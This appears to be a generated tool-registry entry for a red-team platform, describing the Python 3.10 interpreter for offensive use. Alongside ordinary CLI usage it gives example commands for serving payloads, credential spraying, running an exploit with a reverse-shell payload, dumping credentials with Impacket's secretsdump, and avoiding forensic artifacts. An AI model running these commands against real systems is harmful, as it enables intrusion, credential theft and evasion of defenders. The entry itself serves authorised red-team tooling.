---
name: Python3
description: Python 3.10.12 interpreter for custom script development, exploit
  execution, and automation of offensive security tasks.
registry: security
tool_id: python3
category: development
tags:
  - python3
  - scripting
  - automation
  - exploit-dev
  - post-exploitation
  - red-team
  - tooling
mitre_techniques:
  - T1059.006
  - T1027
  - T1003
  - T1057
  - T1083
  - T1518
summary: "Python3 is the primary scripting engine for red team operations. Use
  it to execute custom exploits, automate reconnaissance tasks, parse complex
  output, manipulate payloads, develop prototype tools, and interact with target
  APIs. Invoke with `python3 script.py` or `python3 -c 'code'` for one-liners.
  Python is ideal when existing tools are insufficient or when you need to chain
  multiple operations, parse structured data (JSON/XML), perform
  encoding/decoding operations, or rapidly prototype attack code. Almost all
  modern offensive Python tools require Python 3.x. Scripts can access
  command-line arguments via sys.argv, with sys.argv[0] being the script name
  and sys.argv[1:] containing actual arguments. Use `-c` for inline execution,
  `-m` to run modules (e.g., `python3 -m http.server` for quick file serving),
  `-i` for interactive mode after script execution (useful for debugging), and
  `-B` to avoid writing .pyc bytecode files that leave forensic artifacts.
  Standard library includes critical modules: socket, subprocess, os, sys,
  base64, hashlib, urllib, http.server, json, argparse. Environment variables
  like PYTHONDONTWRITEBYTECODE suppress .pyc creation. Python excels at
  credential manipulation, protocol fuzzing, C2 client development, payload
  encoding, and data exfiltration formatting. Install additional packages with
  `python3 -m pip install package_name` but verify operational security
  first—avoid unnecessary network calls that may alert defenders."
sources:
  - https://pyo3.rs/
  - https://docs.python.org/3/tutorial/index.html
  - https://www.python.org/doc/
  - https://www.codecademy.com/learn/learn-python-3
  - https://wiki.python.org/moin/BeginnersGuide
  - https://commandlinux.com/man-page/man1/python/
  - https://cs.stanford.edu/people/nick/py/python-main.html
  - https://hyperskill.org/university/python/command-line-arguments-in-python
  - https://www.cs.odu.edu/~tkennedy/cs330/sum24/Public/pythonCmdLineArgs/index.html
  - https://stackoverflow.com/questions/4033723/how-do-i-access-command-line-arguments
  - https://www.scribd.com/document/540104573/presentation-191123093318
  - https://github.com/infosecn1nja/Red-Teaming-Toolkit
generated_at: 2026-05-19T11:32:54.352Z
generated_by: anthropic
source_hash: 9e3f3829c5053b1b0ed09a7484cfc61fc859d24a924ca46f956f061a3c936ba2
---

# Python3

## Overview

Python3 (v3.10.12) is a general-purpose interpreted language that serves as the backbone for modern red team tooling. It provides rapid prototyping capabilities, extensive standard library modules for network operations and system interaction, and serves as the runtime for numerous offensive security tools (Empire, Impacket, Responder, etc.). Python is pre-installed on most Linux targets and easily deployed on Windows. Use it for custom script development, tool execution, payload manipulation, data parsing, and automation of complex attack chains.

## When to use

Use Python3 when: (1) Existing tools lack required functionality and you need custom logic. (2) Parsing or manipulating structured data (JSON, XML, CSV) from reconnaissance output. (3) Encoding/decoding payloads (base64, hex, URL encoding). (4) Automating multi-step operations like credential spraying with custom logic. (5) Developing prototype exploits or proof-of-concepts. (6) Interacting with REST APIs or web services on target networks. (7) Building custom C2 clients or communication channels. (8) Processing large datasets from dumps (password lists, user enumeration). (9) Bypassing basic detection by customizing tool behavior. (10) Setting up quick infrastructure (HTTP servers, reverse shells). Prefer Python when Bash is too limited but compiled binaries are overkill or conspicuous.

## Authentication & setup

No authentication required. Python3 is invoked directly from the command line. Verify installation with `python3 --version`. RTPI includes Python 3.10.12 by default. For operational security: Set `PYTHONDONTWRITEBYTECODE=1` environment variable or use `-B` flag to prevent .pyc bytecode file creation that leaves forensic artifacts. Use `python3 -E` to ignore environment variables if you suspect environment tampering. Install third-party packages only when necessary using `python3 -m pip install --user package_name` to avoid system-wide changes. Verify package integrity and avoid installing packages on compromised hosts that phone home. For air-gapped operations, prepare dependencies in advance using `pip download` and transfer wheels manually.

## Key commands / parameters

**Basic execution:** `python3 script.py` runs a script file. `python3 -c 'print("code")'` executes inline Python code (useful for one-liners). `python3 -m module` runs a library module as a script (e.g., `python3 -m http.server 8080`). **Flags:** `-i` enters interactive mode after script execution (inspect variables, debug). `-B` suppresses .pyc bytecode generation. `-E` ignores environment variables. `-O` enables basic optimizations, `-OO` removes docstrings (minimal benefit). `-u` forces unbuffered stdout/stderr (important for real-time logging). `-d` enables parser debugging (rarely needed). `-h` shows help. **Command-line arguments:** Scripts access arguments via `sys.argv` list: `sys.argv[0]` is script name, `sys.argv[1:]` are actual arguments. Example: `python3 exploit.py target.com 443` makes `sys.argv = ['exploit.py', 'target.com', '443']`. Use `argparse` module for complex argument parsing with flags. **Module execution:** `python3 -m http.server` starts web server on port 8000. `python3 -m pip` invokes pip. `python3 -m pytest` runs tests. **Interactive mode:** `python3` with no arguments opens REPL for testing snippets.

## Example workflows

**1. Quick HTTP server for payload delivery:** `python3 -m http.server 8080` serves current directory on port 8080. Navigate to http://target:8080/payload.exe to deliver files. **2. One-liner base64 payload encoding:** `python3 -c 'import base64,sys; print(base64.b64encode(sys.stdin.buffer.read()).decode())' < payload.bin` reads binary, outputs base64. **3. Parse JSON reconnaissance output:** `python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join([h["ip"] for h in d["hosts"]]))' < scan.json` extracts IPs. **4. Custom credential spray script:** `python3 spray.py -u users.txt -p Winter2024! -t https://target.com/api/login --delay 3` with custom retry logic and success detection. **5. Execute exploit with arguments:** `python3 cve_2024_xxxx.py -t 10.10.10.50 -p 445 --payload reverse_shell --lhost 10.8.0.5 --lport 4444`. **6. Debug failed exploit interactively:** `python3 -i exploit.py target.com` runs script, then drops to interactive prompt to inspect variables and test fixes. **7. Generate custom wordlist:** `python3 -c 'import itertools; print("\n".join(["".join(p) for p in itertools.product("admin", "123", "!")]))' > wordlist.txt`. **8. Launch existing red team tool:** `python3 /opt/impacket/examples/secretsdump.py domain/user:pass@target` to dump credentials.

## Output format

Output format depends entirely on the script being executed. Standard print() statements go to stdout, errors to stderr. Python scripts typically output plain text, but may produce JSON, XML, CSV, or binary data. Capture output with shell redirection: `python3 script.py > output.txt 2> errors.txt`. Many offensive tools output colored terminal text using ANSI escape codes—redirect to file and strip with `sed 's/\x1b\[[0-9;]*m//g'` if needed. Interactive mode (python3 REPL) shows `>>>` prompt and evaluates expressions immediately. Scripts using logging module may write to files specified in code. For structured data, prefer JSON output format for easier parsing by other tools: `import json; print(json.dumps(results))`. Exit codes: 0 for success, non-zero for errors (access via `echo $?` in shell).

## Common pitfalls

**1. Bytecode artifacts:** Running scripts creates .pyc files in `__pycache__/` directories—forensic evidence. Always use `-B` flag or set `PYTHONDONTWRITEBYTECODE=1`. **2. Python 2 vs 3 compatibility:** Many older exploits require Python 2 (EOL 2020). Check shebang lines and `print` syntax. RTPI provides Python3 only—legacy scripts may fail. **3. Missing dependencies:** Scripts importing third-party modules (requests, pycryptodome, etc.) will crash if not installed. Verify dependencies before operations: `python3 -c 'import requests'` to test. **4. Encoding issues:** Python3 defaults to UTF-8 but targets may use different encodings. Handle with `open(file, encoding='latin-1')` or `.decode('utf-8', errors='ignore')`. **5. Noisy network calls:** Pip installs, package imports, and poorly written scripts may make unexpected network connections. Test scripts in isolated environments first. **6. Path issues:** Scripts using relative paths fail when run from different directories. Use `os.path.dirname(os.path.abspath(__file__))` to anchor paths. **7. Stdin blocking:** Scripts reading stdin (input(), sys.stdin.read()) will hang if no input provided. Use timeouts or provide input via heredoc/pipe. **8. Unescaped shell commands:** Using os.system() or subprocess without proper escaping creates command injection vulnerabilities in your own tools. Use subprocess with list arguments. **9. Memory consumption:** Loading large files (password dumps, packet captures) into memory can crash Python. Process line-by-line or use generators. **10. Visible processes:** `ps aux | grep python` reveals running scripts. Consider compiled alternatives (PyInstaller) for persistence scenarios.

## References

• https://docs.python.org/3/tutorial/index.html
• https://www.python.org/doc/
• https://commandlinux.com/man-page/man1/python/
• https://cs.stanford.edu/people/nick/py/python-main.html
• https://hyperskill.org/university/python/command-line-arguments-in-python
• https://www.cs.odu.edu/~tkennedy/cs330/sum24/Public/pythonCmdLineArgs/index.html
• https://stackoverflow.com/questions/4033723/how-do-i-access-command-line-arguments
• https://github.com/infosecn1nja/Red-Teaming-Toolkit
• https://wiki.python.org/moin/BeginnersGuide
